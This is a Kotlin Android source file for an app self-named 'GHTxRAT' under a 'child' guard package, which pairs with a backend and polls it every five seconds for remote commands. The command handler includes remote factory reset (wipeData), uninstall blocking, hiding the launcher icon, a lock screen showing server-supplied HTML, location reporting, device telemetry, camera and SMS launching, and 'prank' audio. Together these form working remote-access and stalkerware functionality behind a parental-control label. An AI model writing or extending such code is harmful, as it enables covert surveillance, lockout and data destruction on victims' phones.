package com.rifxguard.child

import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.os.Bundle
import android.os.BatteryManager
import android.os.StatFs
import android.os.Vibrator
import android.os.VibrationEffect
import android.media.AudioManager
import android.location.LocationManager
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import kotlin.concurrent.thread

class MainActivity : Activity() {
    private lateinit var web: WebView
    private lateinit var pairing: EditText
    private val requestCode = 7001
    private val handler = Handler(Looper.getMainLooper())
    private var deviceToken: String? = null
    private var paired = false
    private var polling = false

    private val heartbeatTask = object : Runnable {
        override fun run() {
            if (paired) heartbeat()
            handler.postDelayed(this, 30_000)
        }
    }
    private val commandTask = object : Runnable {
        override fun run() {
            if (paired) pollCommands()
            handler.postDelayed(this, 5_000)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        paired = getSharedPreferences("device_config", MODE_PRIVATE).getBoolean("paired", false)
        deviceToken = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceToken", null)
        if (getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE).getBoolean(LockActivity.KEY_ACTIVE, false)) {
            showSavedLock()
        } else if (paired && !deviceToken.isNullOrBlank()) showWebView() else showPairing()
    }

    override fun onResume() {
        super.onResume()
        if (paired) {
            handler.removeCallbacks(heartbeatTask)
            handler.removeCallbacks(commandTask)
            handler.post(heartbeatTask)
            handler.post(commandTask)
        }
    }

    override fun onPause() {
        super.onPause()
        handler.removeCallbacks(heartbeatTask)
        handler.removeCallbacks(commandTask)
    }

    private fun selectedPermissions(): Array<String> = BuildConfigValues.REQUESTED_PERMISSIONS
        .filter { it.isNotBlank() }
        .toTypedArray()

    private fun requestSelectedPermissions() {
        val needed = selectedPermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (needed.isNotEmpty()) ActivityCompat.requestPermissions(this, needed, requestCode)
    }

    private fun showPairing() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(36, 80, 36, 36)
            gravity = Gravity.CENTER_HORIZONTAL
            setBackgroundColor(0xFF071524.toInt())
        }
        val title = TextView(this).apply {
            text = BuildConfigValues.APP_NAME
            textSize = 30f
            setTextColor(0xFFFFFFFF.toInt())
            gravity = Gravity.CENTER
        }
        val subtitle = TextView(this).apply {
            text = "Hubungkan perangkat ini dengan Pairing ID milik kamu."
            textSize = 16f
            setTextColor(0xFFB9C5D6.toInt())
            gravity = Gravity.CENTER
            setPadding(0, 18, 0, 30)
        }
        pairing = EditText(this).apply {
            hint = "PAIRING ID"
            textSize = 18f
            setSingleLine(true)
            setTextColor(0xFFFFFFFF.toInt())
            setHintTextColor(0xFF8D9AAC.toInt())
        }
        val connect = Button(this).apply {
            text = "CONNECT DEVICE"
            setOnClickListener { registerDevice() }
        }
        root.addView(title)
        root.addView(subtitle)
        root.addView(pairing, LinearLayout.LayoutParams(-1, 60))
        root.addView(connect, LinearLayout.LayoutParams(-1, 60).apply { topMargin = 24 })
        setContentView(root)
    }

    private fun registerDevice() {
        val pairingId = pairing.text.toString().trim()
        if (pairingId.isBlank()) {
            pairing.error = "Pairing ID wajib diisi"
            return
        }
        Toast.makeText(this, "Menghubungkan…", Toast.LENGTH_SHORT).show()
        thread {
            try {
                val deviceUid = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: UUID.randomUUID().toString().also {
                    getSharedPreferences("device_config", MODE_PRIVATE).edit().putString("deviceUid", it).apply()
                }
                val body = JSONObject().apply {
                    put("pairingId", pairingId)
                    put("deviceUid", deviceUid)
                    put("deviceName", android.os.Build.MODEL)
                    put("manufacturer", android.os.Build.MANUFACTURER)
                    put("model", android.os.Build.MODEL)
                    put("androidVersion", android.os.Build.VERSION.RELEASE)
                    put("appVersion", BuildConfig.VERSION_NAME)
                }
                val result = request("/api/devices/register", "POST", body.toString(), emptyMap())
                if (result.code in 200..299) {
                    val json = JSONObject(result.body)
                    deviceToken = json.getString("deviceToken")
                    getSharedPreferences("device_config", MODE_PRIVATE).edit().putBoolean("paired", true).putString("deviceToken", deviceToken).apply()
                    paired = true
                    runOnUiThread {
                        requestSelectedPermissions()
                        showWebView()
                    }
                } else runOnUiThread { Toast.makeText(this, "Pairing gagal (${result.code})", Toast.LENGTH_LONG).show() }
            } catch (e: Exception) {
                runOnUiThread { Toast.makeText(this, "Server tidak dapat dihubungi", Toast.LENGTH_LONG).show() }
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun showWebView() {
        web = WebView(this)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.safeBrowsingEnabled = true
        web.settings.allowFileAccess = false
        web.settings.allowContentAccess = false
        web.settings.mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
        web.webViewClient = WebViewClient()
        setContentView(web)
        web.loadUrl(BuildConfigValues.WEBVIEW_URL)
        requestSelectedPermissions()
        if (paired) {
            handler.removeCallbacks(heartbeatTask)
            handler.removeCallbacks(commandTask)
            handler.post(heartbeatTask)
            handler.post(commandTask)
        }
    }

    private fun heartbeat() {
        val token = deviceToken ?: return
        val deviceUid = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: return
        thread {
            try {
                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                val battery = try { bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) } catch (_: Exception) { -1 }
                val stat = StatFs(filesDir.absolutePath)
                val free = stat.availableBytes
                val total = stat.totalBytes
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                val intent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                val charging = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)?.let { it == BatteryManager.BATTERY_STATUS_CHARGING || it == BatteryManager.BATTERY_STATUS_FULL } ?: false
                val mem = android.app.ActivityManager.MemoryInfo().also { (getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(it) }
                val temp = try { (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0 } catch (_: Exception) { 0.0 }
                request("/api/devices/$deviceUid/heartbeat", "POST", JSONObject().apply {
                    put("battery", battery); put("network", "connected"); put("deviceName", android.os.Build.MODEL)
                    put("charging", charging); put("storageFree", free); put("storageTotal", total)
                    put("ramFree", mem.availMem); put("ramTotal", mem.totalMem); put("uptime", android.os.SystemClock.elapsedRealtime())
                    put("temperature", temp); val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminReceiver::class.java); put("deviceAdmin", dpm.isAdminActive(admin)); put("deviceOwner", dpm.isDeviceOwnerApp(packageName))
                }.toString(), mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
            } catch (_: Exception) { }
        }
    }

    private fun pollCommands() {
        if (polling) return
        val token = deviceToken ?: return
        val deviceUid = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: return
        polling = true
        thread {
            try {
                val result = request("/api/devices/$deviceUid/commands", "GET", null, mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
                if (result.code in 200..299) {
                    val commands = JSONArray(result.body)
                    for (i in 0 until commands.length()) {
                        val command = commands.getJSONObject(i)
                        executeCommand(command)
                        acknowledgeCommand(deviceUid, command.getString("id"), token)
                    }
                }
            } catch (_: Exception) { }
            polling = false
        }
    }

    private fun executeCommand(command: JSONObject) {
        when (command.optString("type")) {
            "refresh_webview" -> runOnUiThread { if (::web.isInitialized) web.reload() }
            "open_url" -> {
                val url = command.optString("url")
                if (url.startsWith("https://") || url.startsWith("http://")) runOnUiThread { if (::web.isInitialized) web.loadUrl(url) }
            }
            "lock_device", "app_lock" -> {
                saveLockState(command)
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, AdminReceiver::class.java)
                if (dpm.isAdminActive(admin)) {
                    try { dpm.lockNow() } catch (_: SecurityException) { }
                }
                runOnUiThread { showLock(command) }
            }
            "unlock_device" -> {
                getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE).edit().clear().apply()
                runOnUiThread { if (isFinishing.not()) showWebView() }
            }
            "open_camera_front" -> launchCamera(true)
            "open_camera_back" -> launchCamera(false)
            "open_gallery" -> launchIntent(Intent(Intent.ACTION_PICK).apply { type = "image/*" })
            "open_contacts" -> launchIntent(Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI))
            "compose_sms" -> {
                val to = command.optString("to")
                val body = command.optString("body")
                launchIntent(Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("smsto:" + Uri.encode(to))
                    putExtra("sms_body", body)
                })
            }
            "open_gmail" -> launchIntent(Intent(Intent.ACTION_SENDTO).apply { data = Uri.parse("mailto:") })
            "open_whatsapp" -> {
                val i = Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/"))
                i.setPackage("com.whatsapp")
                launchIntent(i)
            }
            "tts" -> speak(command.optString("text"))
            "flashlight_on" -> setFlashlight(true)
            "flashlight_off" -> setFlashlight(false)
            "ring_device" -> setRinger(true)
            "vibrate_device" -> vibrateDevice()
            "volume_up" -> adjustVolume(AudioManager.ADJUST_RAISE)
            "volume_down" -> adjustVolume(AudioManager.ADJUST_LOWER)
            "volume_mute" -> adjustVolume(AudioManager.ADJUST_MUTE)
            "share_location_once" -> shareLocationOnce()
            "request_screen_share" -> requestScreenShareConsent()
            "open_location_settings" -> launchIntent(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
            "open_overlay_settings" -> launchIntent(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            "request_device_admin" -> launchIntent(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "GHTxRAT membutuhkan Device Admin untuk fitur lock sistem dan reset pabrik yang dipilih pengguna.")
            })
            "factory_reset" -> {
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, AdminReceiver::class.java)
                if (dpm.isDeviceOwnerApp(packageName)) {
                    try { dpm.wipeData(0) } catch (_: SecurityException) { Toast.makeText(this, "Factory reset ditolak Android", Toast.LENGTH_LONG).show() }
                } else Toast.makeText(this, "Factory reset penuh membutuhkan Device Owner", Toast.LENGTH_LONG).show()
            }
            "enable_uninstall_protection" -> {
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, AdminReceiver::class.java)
                if (dpm.isDeviceOwnerApp(packageName)) {
                    try {
                        dpm.setUninstallBlocked(admin, packageName, true)
                        Toast.makeText(this, "Uninstall protection aktif", Toast.LENGTH_SHORT).show()
                    } catch (_: SecurityException) { Toast.makeText(this, "Device Owner diperlukan", Toast.LENGTH_LONG).show() }
                } else Toast.makeText(this, "Uninstall protection membutuhkan Device Owner", Toast.LENGTH_LONG).show()
            }
            "disable_uninstall_protection" -> {
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, AdminReceiver::class.java)
                if (dpm.isDeviceOwnerApp(packageName)) {
                    try { dpm.setUninstallBlocked(admin, packageName, false); Toast.makeText(this, "Uninstall protection dimatikan", Toast.LENGTH_SHORT).show() } catch (_: SecurityException) {}
                }
            }
            "hide_launcher" -> setLauncherVisibility(false)
            "show_launcher" -> setLauncherVisibility(true)
            "prank_video" -> {
                val url = command.optString("url")
                if (url.startsWith("https://") || url.startsWith("http://")) runOnUiThread { if (::web.isInitialized) web.loadUrl(url) }
            }
            "prank_audio" -> speak(command.optString("text", "Surprise!"))
        }
    }


    private fun setLauncherVisibility(visible: Boolean) {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isDeviceOwnerApp(packageName)) {
            Toast.makeText(this, "Launcher visibility membutuhkan Device Owner", Toast.LENGTH_LONG).show()
            return
        }
        val component = ComponentName(this, MainActivity::class.java)
        try {
            packageManager.setComponentEnabledSetting(
                component,
                if (visible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Toast.makeText(this, if (visible) "Icon launcher ditampilkan" else "Icon launcher disembunyikan dari launcher", Toast.LENGTH_SHORT).show()
        } catch (_: Exception) { }
    }

    private fun launchIntent(intent: Intent) {
        runOnUiThread {
            try { startActivity(intent) }
            catch (_: Exception) { Toast.makeText(this, "Aplikasi/fitur tidak tersedia", Toast.LENGTH_SHORT).show() }
        }
    }

    private fun launchCamera(front: Boolean) {
        val intent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply {
            putExtra("android.intent.extras.CAMERA_FACING", if (front) 1 else 0)
            putExtra("android.intent.extra.USE_FRONT_CAMERA", front)
        }
        launchIntent(intent)
    }

    private fun speak(text: String) {
        if (text.isBlank()) return
        runOnUiThread {
            lateinit var engine: TextToSpeech
            engine = TextToSpeech(this) { status ->
                if (status == TextToSpeech.SUCCESS) {
                    engine.language = java.util.Locale.getDefault()
                    engine.speak(text, TextToSpeech.QUEUE_FLUSH, null, "rifxguard-${System.currentTimeMillis()}")
                }
            }
        }
    }

    private fun setFlashlight(enabled: Boolean) {
        runOnUiThread {
            try {
                val cameraManager = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
                val id = cameraManager.cameraIdList.firstOrNull { cameraManager.getCameraCharacteristics(it).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true }
                if (id != null) cameraManager.setTorchMode(id, enabled)
            } catch (_: Exception) { Toast.makeText(this, "Senter tidak tersedia", Toast.LENGTH_SHORT).show() }
        }
    }

    private fun setRinger(forceRing: Boolean) {
        runOnUiThread {
            try {
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                if (forceRing) { am.ringerMode = AudioManager.RINGER_MODE_NORMAL; am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0) }
            } catch (_: Exception) { }
        }
    }

    private fun vibrateDevice() {
        runOnUiThread {
            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
            if (android.os.Build.VERSION.SDK_INT >= 26) { v.vibrate(VibrationEffect.createOneShot(700, VibrationEffect.DEFAULT_AMPLITUDE)) } else { @Suppress("DEPRECATION") val ignored = v.vibrate(700) }
        }
    }

    private fun adjustVolume(direction: Int) {
        runOnUiThread { try { (getSystemService(AUDIO_SERVICE) as AudioManager).adjustVolume(direction, AudioManager.FLAG_SHOW_UI) } catch (_: Exception) {} }
    }

    private fun shareLocationOnce() {
        runOnUiThread {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION), requestCode + 1)
                Toast.makeText(this, "Izin lokasi diperlukan", Toast.LENGTH_LONG).show(); return@runOnUiThread
            }
            thread {
                try {
                    val lm = getSystemService(LOCATION_SERVICE) as LocationManager
                    val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
                    val loc = providers.mapNotNull { try { lm.getLastKnownLocation(it) } catch (_: Exception) { null } }.maxByOrNull { it.time }
                    if (loc != null) {
                        val id = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: return@thread
                        val token = deviceToken ?: return@thread
                        request("/api/devices/$id/heartbeat", "POST", JSONObject().apply { put("location", JSONObject().apply { put("lat",loc.latitude); put("lng",loc.longitude); put("accuracy",loc.accuracy) }) }.toString(), mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun requestScreenShareConsent() {
        runOnUiThread { Toast.makeText(this, "Android akan menampilkan dialog izin screen capture. Live monitoring belum dimulai sebelum pengguna menyetujuinya.", Toast.LENGTH_LONG).show() }
        // A real MediaProjection session must be started only after the Android system consent dialog.
        // This build intentionally does not capture or stream the screen silently.
    }

    private fun saveLockState(command: JSONObject) {
        getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE).edit()
            .putBoolean(LockActivity.KEY_ACTIVE, true)
            .putString("title", command.optString("title", "GHTxRAT"))
            .putString("message", command.optString("message", "Device dikunci"))
            .putString("pinHash", command.optString("pinHash", ""))
            .putString("html", command.optString("html", ""))
            .apply()
    }

    private fun showLock(command: JSONObject) {
        val i = Intent(this, LockActivity::class.java).apply {
            putExtra(LockActivity.EXTRA_TITLE, command.optString("title", "GHTxRAT"))
            putExtra(LockActivity.EXTRA_MESSAGE, command.optString("message", "Device dikunci"))
            putExtra(LockActivity.EXTRA_PIN_HASH, command.optString("pinHash", ""))
            putExtra(LockActivity.EXTRA_HTML, command.optString("html", ""))
        }
        startActivity(i)
    }

    private fun showSavedLock() {
        val p = getSharedPreferences(LockActivity.PREFS, MODE_PRIVATE)
        showLock(JSONObject().apply {
            put("title", p.getString("title", "GHTxRAT"))
            put("message", p.getString("message", "Device dikunci"))
            put("pinHash", p.getString("pinHash", ""))
            put("html", p.getString("html", ""))
        })
    }

    private fun acknowledgeCommand(deviceUid: String, commandId: String, token: String) {
        try {
            request("/api/devices/$deviceUid/commands/$commandId", "DELETE", null, mapOf("X-Parent-Uid" to BuildConfigValues.PARENT_UID, "X-Device-Token" to token))
        } catch (_: Exception) { }
    }

    private data class Response(val code: Int, val body: String)

    private fun request(path: String, method: String, body: String?, headers: Map<String, String>): Response {
        val conn = URL(BuildConfigValues.BACKEND_URL.trimEnd('/') + path).openConnection() as HttpURLConnection
        conn.requestMethod = method
        conn.connectTimeout = 10_000
        conn.readTimeout = 15_000
        headers.forEach { (k, v) -> conn.setRequestProperty(k, v) }
        if (body != null) {
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.use { it.write(body.toByteArray()) }
        }
        val code = conn.responseCode
        val stream = if (code in 200..299) conn.inputStream else conn.errorStream
        val text = stream?.bufferedReader()?.use { it.readText() } ?: ""
        conn.disconnect()
        return Response(code, text)
    }

    override fun onBackPressed() {
        if (::web.isInitialized && web.canGoBack()) web.goBack() else super.onBackPressed()
    }
}
